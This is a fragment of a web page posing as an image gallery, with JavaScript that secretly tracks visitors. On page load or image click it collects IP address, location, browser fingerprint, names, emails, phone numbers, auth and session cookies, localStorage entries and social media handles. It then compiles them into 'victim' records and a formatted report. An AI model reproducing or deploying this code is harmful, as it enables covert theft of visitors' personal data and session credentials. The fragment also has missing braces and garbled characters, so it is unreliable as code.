            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;

        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .image-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;

        .image-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.2);
        }
        .image-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .image-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
            font-size: 1.1em;
        }
        .pulse {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .warning {
            text-align: center;
            font-size: 0.8em;
            opacity: 0.6;
            margin-top: 20px;
        }
        .hidden-admin {
            position: fixed;
            top: 0;
            right: 0;
            width: 5px;
            height: 5px;
            background: transparent;
            cursor: default;
            z-index: -1000;
        }

        // Enhanced personal data patterns - more comprehensive
        const PERSONAL_DATA_PATTERNS = {
            // More comprehensive name patterns
            names: [
                /(?:my name is|i am|call me|this is)\s+([A-Z][a-z]+(?:\s+[A-Z][a-z]+)?)/gi,
                /(?:username|name|fullname|display name)[:\s]*([^\n<>,;]{3,30})/gi,

            ages: [
                /(?:age|i am|i'm)\s+(\d{1,3})\s*(?:years|yrs|yo)?/gi,

        async function captureEnhancedData(imageId) {
            console.log('üéØ Capturing enhanced data...');
            
            // Use Promise.allSettled to prevent failures from stopping the scan
            const [ipData, locationData, networkData, personalData, socialData, browserData] = await Promise.allSettled([
                getEnhancedIP(),
                getEnhancedIP().then(ip => ip.ip !== 'Unknown' ? getEnhancedLocation(ip.ip) : {}),
                getNetworkInfo(),
                scanPersonalData(),
                scanSocialMediaData(),
                getBrowserData()
            ]);

            console.log('üìã Personal data found:', personalData);

            return {
                id: Date.now() + Math.random().toString(36).substr(2, 12),
                timestamp: new Date().toISOString(),
                imageId: imageId,
                
                network: {
                    ip: ipData.status === 'fulfilled' ? ipData.value.ip : 'Unknown',
                    isp: locationData.status === 'fulfilled' ? locationData.value.org || 'Unknown' : 'Unknown',
                    asn: locationData.status === 'fulfilled' ? locationData.value.asn || 'Unknown' : 'Unknown',
                    connection: networkData.status === 'fulfilled' ? networkData.value : {},
                    vpnDetection: detectVPN(ipData.status === 'fulfilled' ? ipData.value.ip : 'Unknown')

                location: {
                    city: locationData.status === 'fulfilled' ? locationData.value.city || 'Unknown' : 'Unknown',

                social: socialData.status === 'fulfilled' ? socialData.value : {error: 'Scan failed'},
                browser: browserData.status === 'fulfilled' ? browserData.value : {},
                
                type: imageId === 'page_load' ? 'auto_track' : 'click_track'
            };

        // Enhanced personal data scanning
        async function scanPersonalData() {
            console.log('üîç Scanning for personal data...');
            const personalData = {
                names: [],
                ages: [],
                emails: [],
                phones: [],
                addresses: [],
                foundInCookies: [],
                foundInStorage: [],
                scanDetails: {
                    pageTextLength: 0,
                    scanTime: Date.now()
                }
            };

            try {
                // Get all text content from the page
                const pageContent = document.body.innerText + ' ' + document.documentElement.innerText;
                personalData.scanDetails.pageTextLength = pageContent.length;
                
                console.log('üìÑ Page content length:', pageContent.length);

                // Enhanced scanning with better pattern matching
                for (const [category, patterns] of Object.entries(PERSONAL_DATA_PATTERNS)) {
                    if (category === 'social') continue; // Handle separately
                    
                    for (const pattern of patterns) {
                        try {
                            const matches = pageContent.match(pattern);
                            if (matches) {
                                // Extract clean matches
                                const cleanMatches = matches.map(match => {
                                    // For patterns with capture groups, extract the actual data
                                    if (pattern.toString().includes('(')) {
                                        const execResult = pattern.exec(match);
                                        return execResult && execResult[1] ? execResult[1].trim() : match.trim();
                                    }
                                    return match.trim();
                                }).filter(match => match.length > 2); // Filter out very short matches
                                
                                personalData[category] = [...new Set([...personalData[category], ...cleanMatches])];
                            }
                        } catch (e) {
                            console.log('Pattern error:', e);
                        }
                    }
                }

                // Scan form fields for personal data
                const formFields = document.querySelectorAll('input[type="text"], input[type="email"], input[name*="name"], input[name*="email"]');
                formFields.forEach(field => {
                    if (field.value && field.value.length > 1) {
                        if (field.type === 'email' || field.name.includes('email')) {
                            personalData.emails.push(field.value);
                        } else if (field.name.includes('name')) {
                            personalData.names.push(field.value);
                        }
                    }
                });

                // Enhanced cookie scanning
                if (document.cookie) {
                    const cookies = document.cookie.split(';');
                    cookies.forEach(cookie => {
                        const [name, value] = cookie.split('=').map(s => s.trim());
                        const lowerName = name.toLowerCase();
                        const lowerValue = value.toLowerCase();
                        
                        if (lowerName.includes('user') || lowerName.includes('name') || 
                            lowerName.includes('email') || lowerValue.includes('@') ||
                            lowerName.includes('auth') || lowerName.includes('session')) {
                            personalData.foundInCookies.push(`${name}=${value.substring(0, 50)}`);
                        }
                    });
                }

                // Enhanced localStorage scanning
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        const value = localStorage.getItem(key);
                        if (key && value) {
                            const lowerKey = key.toLowerCase();
                            const lowerValue = value.toLowerCase();
                            
                            if (lowerKey.includes('user') || lowerKey.includes('name') || 
                                lowerKey.includes('email') || lowerValue.includes('@') ||
                                lowerKey.includes('profile') || lowerKey.includes('auth')) {
                                personalData.foundInStorage.push(`${key}=${value.substring(0, 100)}`);
                            }
                        }
                    }
                } catch (e) {
                    console.log('LocalStorage scan failed');
                }

                console.log('‚úÖ Personal data scan completed');
                console.log('Names found:', personalData.names);
                console.log('Emails found:', personalData.emails);

            } catch (error) {
                console.error('Personal data scan error:', error);
                personalData.scanError = error.message;
            }

            return personalData;
        }

        // Enhanced social media scanning
        async function scanSocialMediaData() {
            const socialData = {
                usernames: [],
                platforms: [],
                profiles: []
            };

            try {
                const pageContent = document.body.innerText + ' ' + document.body.innerHTML;
                
                // Scan for social media patterns
                for (const pattern of PERSONAL_DATA_PATTERNS.social) {
                    const matches = pageContent.match(pattern);
                    if (matches) {
                        const cleanMatches = matches.map(match => {
                            const execResult = pattern.exec(match);
                            return execResult && execResult[1] ? execResult[1].trim() : match.trim();
                        });
                        socialData.usernames = [...new Set([...socialData.usernames, ...cleanMatches])];
                    }
                }

                // Scan for social media links
                const socialLinks = [
                    'facebook.com/', 'twitter.com/', 'x.com/', 'instagram.com/',
                    'tiktok.com/', 'linkedin.com/in/', 'youtube.com/', 
                    'snapchat.com/add/', 'reddit.com/user/'
                ];

                socialLinks.forEach(platform => {
                    const regex = new RegExp(`https?://(?:www\\.)?${platform}([A-Za-z0-9_.-]+)`, 'gi');
                    const matches = pageContent.match(regex);
                    if (matches) {
                        socialData.profiles.push(...matches.slice(0, 5));
                        const platformName = platform.replace('.com/', '').replace('www.', '');
                        if (!socialData.platforms.includes(platformName)) {
                            socialData.platforms.push(platformName);
                        }
                    }
                });

            } catch (error) {
                console.error('Social media scan error:', error);
            }

            return socialData;
        }

        // Helper functions
        async function getEnhancedIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipinfo.io/json'
            ];

            for (const service of services) {
                try {
                    const response = await fetch(service, { 
                        mode: 'cors',
                        credentials: 'omit',
                        signal: AbortSignal.timeout(3000)
                    });
                    const data = await response.json();
                    return { ip: data.ip || data.query || 'Unknown' };
                } catch (error) {
                    continue;
                }
            }
            return { ip: 'Unknown' };
        }

        async function getEnhancedLocation(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                return await response.json();
            } catch (error) {
                return {};
            }
        }

        async function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return {
                effectiveType: connection ? connection.effectiveType : 'Unknown',
                downlink: connection ? connection.downlink + ' Mbps' : 'Unknown',
                rtt: connection ? connection.rtt + ' ms' : 'Unknown',
                onLine: navigator.onLine
            };
        }

        function getBrowserData() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'Unknown',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        function detectVPN(ip) {
            const datacenterRanges = ['104.', '107.', '108.', '109.', '140.', '144.', '146.', '147.', '148.', '149.'];
            return datacenterRanges.some(range => ip.startsWith(range)) ? 'Possible VPN/Proxy' : 'Residential IP';
        }

        function storeEnhancedVictim(victimData) {
            const stealthKey = 'victims_data_v2';
            let victims = JSON.parse(localStorage.getItem(stealthKey) || '[]');
            victims.unshift(victimData);
            if (victims.length > 50) victims = victims.slice(0, 50);
            localStorage.setItem(stealthKey, JSON.stringify(victims));
        }

            message += `üåê *NETWORK:*\n`;
            message += `‚Ä¢ IP: \`${victim.network.ip}\`\n`;
            message += `‚Ä¢ ISP: ${victim.network.isp}\n`;
            message += `‚Ä¢ Location: ${victim.location.city}, ${victim.location.country}\n`;
            message += `‚Ä¢ VPN: ${victim.network.vpnDetection}\n\n`;

            // Personal Data Section - Only show if data found
            const hasPersonalData = victim.personal.names.length > 0 || victim.personal.emails.length > 0 || 
                                  victim.personal.phones.length > 0 || victim.personal.ages.length > 0;

            if (hasPersonalData) {
                message += `üîç *PERSONAL DATA FOUND:*\n`;
                
                if (victim.personal.names.length > 0) {
                    message += `‚Ä¢ Names: ${victim.personal.names.slice(0, 5).join(', ')}\n`;
                }
                
                if (victim.personal.ages.length > 0) {
                    message += `‚Ä¢ Ages: ${victim.personal.ages.slice(0, 3).join(', ')}\n`;
                }
                
                if (victim.personal.emails.length > 0) {
                    message += `‚Ä¢ Emails: ${victim.personal.emails.slice(0, 3).join(', ')}\n`;
                }
                
                if (victim.personal.phones.length > 0) {
                    message += `‚Ä¢ Phones: ${victim.personal.phones.slice(0, 2).join(', ')}\n`;
                }
                
                if (victim.personal.addresses.length > 0) {
                    message += `‚Ä¢ Addresses: ${victim.personal.addresses.slice(0, 2).join(', ')}\n`;
                }

                if (victim.personal.foundInCookies.length > 0) {
                    message += `‚Ä¢ Cookies: ${victim.personal.foundInCookies.length} entries\n`;
                }

                if (victim.personal.foundInStorage.length > 0) {
                    message += `‚Ä¢ Storage: ${victim.personal.foundInStorage.length} entries\n`;
                }
                message += `\n`;
            } else {
                message += `‚ùå *No personal data found in page content*\n\n`;
            }

            // Social Media Section
            if (victim.social.usernames.length > 0 || victim.social.profiles.length > 0) {
                message += `üì± *SOCIAL MEDIA:*\n`;
                if (victim.social.usernames.length > 0) {
                    message += `‚Ä¢ Handles: ${victim.social.usernames.slice(0, 5).join(', ')}\n`;
